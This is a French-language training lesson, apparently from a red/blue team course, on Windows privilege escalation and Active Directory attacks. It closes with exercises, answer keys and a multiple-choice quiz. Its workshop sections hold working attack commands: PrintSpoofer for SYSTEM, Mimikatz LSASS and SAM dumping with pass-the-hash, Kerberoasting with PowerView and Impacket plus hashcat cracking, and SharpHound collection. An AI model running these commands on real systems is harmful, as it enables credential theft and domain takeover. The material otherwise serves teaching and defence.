# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 204 (6h) : Escalade de Privilèges Windows & Active Directory Hacking (Token Impersonation, Mimikatz, Kerberoasting & BloodHound)

> [!NOTE]
> **Objectif du jour :** Maîtriser l'escalade de privilèges sous **Windows** et les attaques sur **Active Directory (AD)** : **Token Impersonation** (Potato attacks), mauvais services Windows (**Unquoted Service Paths**), utilisation de **Mimikatz** pour l'extraction de secrets LSASS, attaques d'authentification Kerberos (**Kerberoasting** & AS-REP Roasting), et cartographie des chemins d'attaque Active Directory avec **BloodHound**.
>
> **Compétences visées :** `SEC-06` (A) — Windows PrivEsc & Active Directory Hacking | `SEC-04` (A) — Kerberoasting & BloodHound Mapping

---

## 1) Module — Escalade de Privilèges Windows Local (2h)

### 📖 Narration/Intuition

Lorsque vous obtenez un shell initial sur une machine Windows (ex: via une vulnérabilité dans une application IIS ou un poste de travail compromis), votre compte est souvent un compte utilisateur ordinaire ou un compte de service (`NT AUTHORITY\LOCAL SERVICE`).

L'objectif de l'escalade de privilèges locale sous Windows est de devenir **`NT AUTHORITY\SYSTEM`** (le compte le plus élevé du système Windows, équivalent de root sous Linux).

### 🔍 Anatomie Technique

**Vecteurs d'Escalade de Privilèges Windows Locaux :**

```
 ┌────────────────────────────────────────────────────────┐
 │ 1. TOKEN IMPERSONATION & ELEVATION PRIVILEGES          │
 │  - Privilèges dangereux : SeImpersonatePrivilege,       │
 │    SeAssignPrimaryTokenPrivilege                       │
 │  - Exploits : Juicy Potato, Rogue Potato, PrintSpoofer  │
 └──────────────────────────┬─────────────────────────────┘
                            │
                            ▼
 ┌────────────────────────────────────────────────────────┐
 │ 2. UNQUOTED SERVICE PATHS (Chemins de service non cités)│
 │  - Exemple : C:\Program Files\BCC Banking\service.exe  │
 │  - Windows cherche : C:\Program.exe ──►                │
 │    C:\Program Files\BCC.exe ──► Exécution malveillante │
 └──────────────────────────┬─────────────────────────────┘
                            │
                            ▼
 ┌────────────────────────────────────────────────────────┐
 │ 3. DUMPAGE DE LA MÉMOIRE LSASS (Mimikatz)              │
 │  - Extraire les mots de passe et hashes NTLM en RAM    │
 └────────────────────────────────────────────────────────┘
```

**Exploitation des Privilèges Windows avec PrintSpoofer :**

```powershell
# 1. Vérifier les privilèges du compte actuel (whoami /priv)
whoami /priv

# Exemple de privilège critique présent :
# Privilege Name                Description                               Status
# ============================= ========================================= ========
# SeImpersonatePrivilege        Impersonate a client after authentication Enabled

# 2. Exploiter SeImpersonatePrivilege avec PrintSpoofer (Obtenir un shell SYSTEM)
.\PrintSpoofer.exe -i -c cmd.exe

# Résultat : Shell NT AUTHORITY\SYSTEM immédiat !
```

---

## 2) Module — Mimikatz & Credential Dumping (2h)

### 📖 Narration/Intuition

Le processus **LSASS (Local Security Authority Subsystem Service)** de Windows gère l'authentification et conserve en mémoire RAM les jetons de session, les hashes NTLM et parfois les mots de passe en clair des utilisateurs récemment connectés.

**Mimikatz** (développé par Benjamin Delpy) est l'outil mythique d'extraction de secrets de la mémoire LSASS, des tickets Kerberos et de génération de faux tickets d'accès (**Golden Ticket / Silver Ticket**).

### 🔍 Anatomie Technique

**Commandes Mimikatz Essentielles :**

```cmd
:: Lancer Mimikatz avec les privilèges d'administrateur
mimikatz.exe

:: 1. Activer le privilège de débogage (nécessaire pour accéder au processus LSASS)
privilege::debug

:: 2. Extraire les mots de passe en clair et hashes NTLM de la mémoire LSASS
sekurlsa::logonpasswords

:: 3. Extraire les hashes NTLM de la base locale SAM
lsadump::sam

:: 4. Attaque Pass-The-Hash (Se connecter sans connaître le mot de passe en clair)
sekurlsa::pth /user:Administrator /domain:bcc.cd /ntlm:a1b2c3d4e5f67890a1b2c3d4e5f67890 /run:cmd.exe
```

---

## 3) Module — Active Directory Hacking : Kerberoasting & BloodHound (2h)

### 📖 Narration/Intuition

**Active Directory (AD)** est le cœur de l'annuaire d'entreprise de 95% des banques mondiales. Il gère l'ensemble des utilisateurs, ordinateurs, serveurs et politiques de sécurité.

**Kerberoasting** est une attaque dévastatrice sur le protocole d'authentification Kerberos d'Active Directory : tout utilisateur authentifié du domaine (même le plus restreint) peut demander un ticket d'accès (TGS) pour n'importe quel compte de service possédant un **SPN (Service Principal Name)**. La partie chiffrée de ce ticket est chiffrée avec le hash du mot de passe du compte de service. L'attaquant extrait ce ticket et casse le mot de passe **hors-ligne (offline)** avec Hashcat sans générer d'alerte sur l'AD.

### 🛠️ Atelier Pratique

**Attaque Kerberoasting & Cartographie BloodHound :**

```powershell
# ══════════════════════════════════════════════════════════
# ATTAQUE 1 : KERBEROASTING AVEC POWERSHELL / IMPACKET
# ══════════════════════════════════════════════════════════

# Option A : Depuis une machine du domaine avec PowerShell (GetUserSPNs.ps1)
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Out-File -FilePath kerberoast_hashes.txt

# Option B : Depuis une machine externe avec Impacket (GetUserSPNs.py)
python3 GetUserSPNs.py bcc.cd/kabilaj:MonMotDePasse123! -dc-ip 192.168.1.10 -request -outputfile hashes.kerberoast

# Casser le hash hors-ligne avec Hashcat (Mode 13100 = Kerberos 5 TGS-REP)
hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# ══════════════════════════════════════════════════════════
# ATTAQUE 2 : CARTOGRAPHIE ACTIVE DIRECTORY AVEC BLOODHOUND
# ══════════════════════════════════════════════════════════

# 1. Collecter les données de l'AD avec SharpHound.exe sur la cible
.\SharpHound.exe --CollectionMethods All --Domain bcc.cd

# 2. Importer le fichier ZIP généré dans l'interface graphique BloodHound
# 3. Exécuter la requête pré-générée : "Find Shortest Paths to Domain Admins"
# BloodHound affiche graphiquement la chaîne exacte de compromission :
# User Restricted ──(GenericAll)──► Group Ops ──(MemberOf)──► Server BDD ──(AdminTo)──► Domain Admin !
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **AD** | Active Directory — Service d'annuaire et de gestion des identités de Microsoft |
| **LSASS** | Local Security Authority Subsystem Service — Processus Windows gérant l'authentification |
| **SPN** | Service Principal Name — Identifiant unique d'un service dans Active Directory |
| **TGS** | Ticket Granting Service — Ticket d'accès Kerberos pour un service spécifique |
| **NTLM** | NT LAN Manager — Suite de protocoles de sécurité Microsoft d'authentification par hash |
| **PTH** | Pass-The-Hash — Technique d'authentification utilisant le hash NTLM direct sans mot de passe |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Expliquer le fonctionnement de l'attaque **Kerberoasting** et pourquoi elle est si difficile à détecter par l'équipe Blue Team / SOC sans règles d'audit avancées.

**Corrigé :** Dans le fonctionnement **normal** de Kerberos, n'importe quel utilisateur authentifié du domaine a le droit légitime d'interroger l'Active Directory pour demander un ticket TGS pour n'importe quel service possédant un SPN (ex: `MSSQLSvc/db.bcc.cd`). Le contrôleur de domaine (KDC) répond en fournissant un ticket TGS dont une partie est chiffrée avec la clé (hash NTLM) du compte de service. L'attaquant récupère cette réponse en mémoire et la sauvegarde dans un fichier. Il emporte ce fichier sur sa propre machine pour exécuter une attaque par force brute/dictionnaire **hors-ligne** (Hashcat). Le contrôleur de domaine ne voit passer qu'une **demande de ticket TGS parfaitement légitime** et aucune activité suspecte n'a lieu sur le réseau pendant le cassage du mot de passe.

**Exercice 2 :** Qu'est-ce qu'un **Unquoted Service Path** (chemin de service non cité) sous Windows et comment permet-il une escalade de privilèges vers `SYSTEM` ?

**Corrigé :** Lorsqu'un service Windows est configuré avec un chemin d'accès binaire contenant des espaces ET non entouré de guillemets (ex: `C:\Program Files\BCC Banking\service.exe`), la fonction Win32 `CreateProcess` interprète les espaces comme des séparateurs potentiels et tente d'exécuter dans l'ordre : (1) `C:\Program.exe`, (2) `C:\Program Files\BCC.exe`, (3) `C:\Program Files\BCC Banking\service.exe`. Si un utilisateur ordinaire dispose des droits d'écriture dans le répertoire `C:\Program Files\`, il peut y placer son propre binaire malveillant nommé `BCC.exe`. Lors du redémarrage du service (qui s'exécute généralement en tant que `NT AUTHORITY\SYSTEM`), Windows exécute `C:\Program Files\BCC.exe` avec les privilèges `SYSTEM`, accordant le contrôle total du serveur à l'attaquant.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel est le compte utilisateur avec le plus haut niveau de privilèges sur un système d'exploitation Windows local (équivalent de `root` sous Linux) ?
- A) `NT AUTHORITY\SYSTEM`
- B) Administrator
- C) Guest
- D) Network Service

**Réponse : A**

**Q2 :** Quel outil mythique de cybersécurité développé par Benjamin Delpy permet d'extraire les mots de passe et hashes NTLM en mémoire RAM depuis le processus LSASS Windows ?
- A) Mimikatz
- B) Nmap
- C) Wireshark
- D) Metasploit

**Réponse : A**

**Q3 :** Quelle attaque Active Directory permet à un utilisateur ordinaire de demander un ticket TGS chiffré pour un compte de service (SPN) et de le casser hors-ligne pour obtenir son mot de passe ?
- A) Kerberoasting
- B) SQL Injection
- C) Cross-Site Scripting
- D) DNS Spoofing

**Réponse : A**

**Q4 :** Quel outil de cartographie graphique utilise la théorie des graphes pour révéler les chemins d'attaque cachés vers les privilèges Domain Admin dans Active Directory ?
- A) BloodHound
- B) Wireshark
- C) Burp Suite
- D) Nessus

**Réponse : A**

**Q5 :** Quel privilège utilisateur Windows (visibles via `whoami /priv`) permet d'exécuter des attaques de type "Potato" (Juicy Potato, PrintSpoofer) pour devenir `SYSTEM` ?
- A) `SeImpersonatePrivilege`
- B) `SeShutdownPrivilege`
- C) `SeChangeNotifyPrivilege`
- D) `SeTimeZonePrivilege`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
